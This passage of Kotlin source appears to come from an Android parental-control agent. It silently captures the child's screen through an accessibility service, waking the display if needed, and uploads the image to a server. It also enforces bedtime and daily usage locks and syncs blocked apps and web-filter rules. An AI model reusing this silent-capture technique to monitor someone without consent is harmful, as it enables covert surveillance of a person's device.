        Log.d(TAG, "Taking silent screenshot via AgentAccessibilityService...")
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
            if (pm != null && !pm.isInteractive) {
                @Suppress("DEPRECATION")
                val wakeLock = pm.newWakeLock(
                    android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "KidsAgent:ScreenshotWakeLock"
                )
                wakeLock.acquire(3000)
            }
        } catch (e: Exception) {
            Log.w(TAG, "Could not acquire temporary wake lock: ${e.message}")
        }

        val accessService = AgentAccessibilityService.instance
        if (accessService == null) {
            Log.e(TAG, "AgentAccessibilityService instance is null! Is it enabled?")
            val res = ScreenshotPayload(
                imageBase64 = null,
                error = "خدمة إمكانية الوصول (Accessibility) غير مفعلة على جهاز الطفل. يرجى تفعيلها من إعدادات الهاتف.",
                timestamp = System.currentTimeMillis()
            )
            wsClient?.sendMessage("SCREENSHOT_CAPTURED", res)
            return
        }

        accessService.takeScreenshotSilently { bitmap, errorReason ->
            if (bitmap != null) {
                scope.launch(Dispatchers.IO) {
                    try {
                        val baos = java.io.ByteArrayOutputStream()
                        bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 70, baos)
                        val bytes = baos.toByteArray()
                        val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                        val res = ScreenshotPayload(
                            imageBase64 = b64,
                            error = null,
                            timestamp = System.currentTimeMillis()
                        )
                        wsClient?.sendMessage("SCREENSHOT_CAPTURED", res)
                        Log.d(TAG, "Screenshot sent successfully! Size: ${bytes.size} bytes")
                    } catch (e: Exception) {
                        Log.e(TAG, "Error compressing screenshot: ${e.message}")
                        val res = ScreenshotPayload(
                            imageBase64 = null,
                            error = "خطأ أثناء ضغط لقطة الشاشة: ${e.message}",
                            timestamp = System.currentTimeMillis()
                        )
                        wsClient?.sendMessage("SCREENSHOT_CAPTURED", res)
                    } finally {
                        bitmap.recycle()
                    }
                }
            } else {
                Log.e(TAG, "AccessibilityService screenshot returned null: $errorReason")
                val res = ScreenshotPayload(
                    imageBase64 = null,
                    error = errorReason ?: "فشل التقاط لقطة الشاشة من نظام الجهاز",
                    timestamp = System.currentTimeMillis()
                )
                wsClient?.sendMessage("SCREENSHOT_CAPTURED", res)
            }
        }
    }

    private fun scheduleScreenTimeAndBedtimeMonitor() {
        scope.launch {
            while (isActive) {
                try {
                    checkBedtimeAndDailyLimit()
                    checkLowBatteryAlert()
                } catch (e: Exception) {
                    Log.e(TAG, "Error in screen time monitor: ${e.message}")
                }
                delay(60_000L) // Every 1 minute
            }
        }
    }

    private fun checkBedtimeAndDailyLimit() {
        val rule = screenTimeRule ?: return
        if (!rule.isActive) return

        val now = Calendar.getInstance()
        val currentMinutes = now.get(Calendar.HOUR_OF_DAY) * 60 + now.get(Calendar.MINUTE)

        // 1. Bedtime Schedule Check
        val startStr = rule.downtimeStart
        val endStr = rule.downtimeEnd
        if (!startStr.isNullOrEmpty() && !endStr.isNullOrEmpty()) {
            val startParts = startStr.split(":")
            val endParts = endStr.split(":")
            if (startParts.size == 2 && endParts.size == 2) {
                val startMin = (startParts[0].toIntOrNull() ?: 0) * 60 + (startParts[1].toIntOrNull() ?: 0)
                val endMin = (endParts[0].toIntOrNull() ?: 0) * 60 + (endParts[1].toIntOrNull() ?: 0)

                val isBedtime = if (startMin > endMin) {
                    currentMinutes >= startMin || currentMinutes < endMin
                } else {
                    currentMinutes in startMin until endMin
                }

                if (isBedtime) {
                    Log.w(TAG, "Bedtime active! Locking device ($startStr - $endStr)")
                    lockDeviceScreen("حان وقت النوم\n(Bedtime Schedule Active: $startStr - $endStr)")
                    return
                }
            }
        }

        // 2. Daily Limit Check
        if (rule.dailyLimitMinutes > 0) {
            val stats = usageTracker?.getTodayUsageStats() ?: emptyList()
            val totalSeconds = stats.sumOf { it.usageDurationSeconds }
            val totalMinutes = totalSeconds / 60
            if (totalMinutes >= rule.dailyLimitMinutes) {
                Log.w(TAG, "Daily limit reached ($totalMinutes >= ${rule.dailyLimitMinutes} min)")
                lockDeviceScreen("تم استنفاد الحد اليومي لوقت الشاشة\n(${rule.dailyLimitMinutes} دقيقة)")
            }
        }
    }

    private fun checkLowBatteryAlert() {
        val bm = getSystemService(Context.BATTERY_SERVICE) as? BatteryManager ?: return
        val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val isCharging = bm.isCharging
        if (level in 1..15 && !isCharging) {
            val now = System.currentTimeMillis()
            if (now - lastLowBatteryAlertTime > 30 * 60 * 1000L) {
                lastLowBatteryAlertTime = now
                val payload = LowBatteryAlertPayload(level, isCharging, now)
                wsClient?.sendMessage("LOW_BATTERY_ALERT", payload)
                Log.w(TAG, "LOW_BATTERY_ALERT sent to parents: $level%")
            }
        }
    }

    private fun loadPersistedScreenTimeRule() {
        val json = KidsAgentApp.instance.prefs.getString("screen_time_rule_json", null)
        if (json != null) {
            try {
                screenTimeRule = gson.fromJson(json, ScreenTimeRulePayload::class.java)
                Log.d(TAG, "Loaded saved screen time rule: $screenTimeRule")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to parse saved screen time rule: ${e.message}")
            }
        }
    }

    private fun saveScreenTimeRule(rule: ScreenTimeRulePayload) {
        screenTimeRule = rule
        KidsAgentApp.instance.prefs.edit()
            .putString("screen_time_rule_json", gson.toJson(rule))
            .apply()
        Log.d(TAG, "Screen time rule saved to SharedPreferences: $rule")
    }

    private fun registerNetworkCallback() {
        try {
            connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            val request = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()

            networkCallback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    super.onAvailable(network)
                    Log.i(TAG, "Internet connection restored! Triggering immediate offline batch sync...")
                    OfflineSyncWorker.enqueue(this@ForegroundSyncService)
                    syncBlockedPackagesFromServer()
                    if (wsClient?.isConnected == false) {
                        wsClient?.connect()
                    }
                }
            }
            connectivityManager?.registerNetworkCallback(request, networkCallback!!)
            Log.d(TAG, "NetworkCallback registered for offline sync resilience")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register network callback: ${e.message}")
        }
    }

    private fun syncBlockedPackagesFromServer() {
        scope.launch(Dispatchers.IO) {
            try {
                val app = KidsAgentApp.instance
                val deviceId = app.prefs.getString(KidsAgentApp.KEY_DEVICE_ID, null)
                val serverUrl = app.prefs.getString(KidsAgentApp.KEY_SERVER_URL, null)
                if (deviceId != null && serverUrl != null) {
                    val req = Request.Builder()
                        .url("$serverUrl/api/v1/agent/$deviceId/blocked-apps")
                        .get()
                        .build()
                    val res = httpClient.newCall(req).execute()
                    if (res.isSuccessful) {
                        val body = res.body?.string()
                        if (!body.isNullOrEmpty()) {
                            val pkgs = gson.fromJson(body, Array<String>::class.java)
                            synchronized(blockedPackages) {
                                blockedPackages.clear()
                                blockedPackages.addAll(pkgs)
                            }
                            saveBlockedPackages(this@ForegroundSyncService)
                            Log.i(TAG, "Successfully synced ${blockedPackages.size} blocked apps from server")
                        }
                    }
                    res.close()

                    try {
                        val statusReq = Request.Builder()
                            .url("$serverUrl/api/v1/agent/$deviceId/status")
                            .get()
                            .build()
                        val statusRes = httpClient.newCall(statusReq).execute()
                        if (statusRes.isSuccessful) {
                            val statusBody = statusRes.body?.string()
                            if (!statusBody.isNullOrBlank()) {
                                val json = org.json.JSONObject(statusBody)
                                val paused = json.optBoolean("is_monitoring_paused", false)
                                saveMonitoringState(this@ForegroundSyncService, paused)
                            }
                        }
                        statusRes.close()
                    } catch (e: Exception) {
                        Log.w(TAG, "Failed to sync status: ${e.message}")
                    }

                    try {
                        val filterReq = Request.Builder()
                            .url("$serverUrl/api/v1/agent/$deviceId/web-filter")
                            .get()
                            .build()
                        val filterRes = httpClient.newCall(filterReq).execute()
                        if (filterRes.isSuccessful) {
                            val filterBody = filterRes.body?.string()
                            if (!filterBody.isNullOrBlank()) {
                                val json = org.json.JSONObject(filterBody)
                                val enabled = json.optBoolean("is_web_filter_enabled", true)
                                val kwArray = json.optJSONArray("keywords")
                                val domArray = json.optJSONArray("domains")
                                val kws = mutableListOf<String>()
                                if (kwArray != null) {
                                    for (i in 0 until kwArray.length()) {
                                        kws.add(kwArray.getString(i))
                                    }
                                }
                                val doms = mutableListOf<String>()
                                if (domArray != null) {
                                    for (i in 0 until domArray.length()) {
                                        doms.add(domArray.getString(i))
                                    }
                                }
                                saveWebFilterRules(this@ForegroundSyncService, enabled, kws, doms)
                                Log.i(TAG, "Synced web filter from REST: enabled=$enabled, keywords=${kws.size}, domains=${doms.size}")
                            }
                        }
                        filterRes.close()
                    } catch (e: Exception) {
                        Log.w(TAG, "Failed to sync web filter: ${e.message}")
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Failed to fetch blocked apps from server (offline/fallback): ${e.message}")
            }
        }
    }

    private fun unregisterNetworkCallback() {
        try {
            networkCallback?.let { connectivityManager?.unregisterNetworkCallback(it) }
            networkCallback = null
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering network callback: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        if (instance == this) instance = null
        isServiceRunning = false
        simWatcher?.stopWatching()
        unregisterNetworkCallback()
        locationTracker?.stopTracking()
        wsClient?.disconnect()
        webRTCManager?.dispose()
        stopAlarmSound()
        scope.cancel()
        Log.d(TAG, "ForegroundSyncService onDestroy")
    }
}

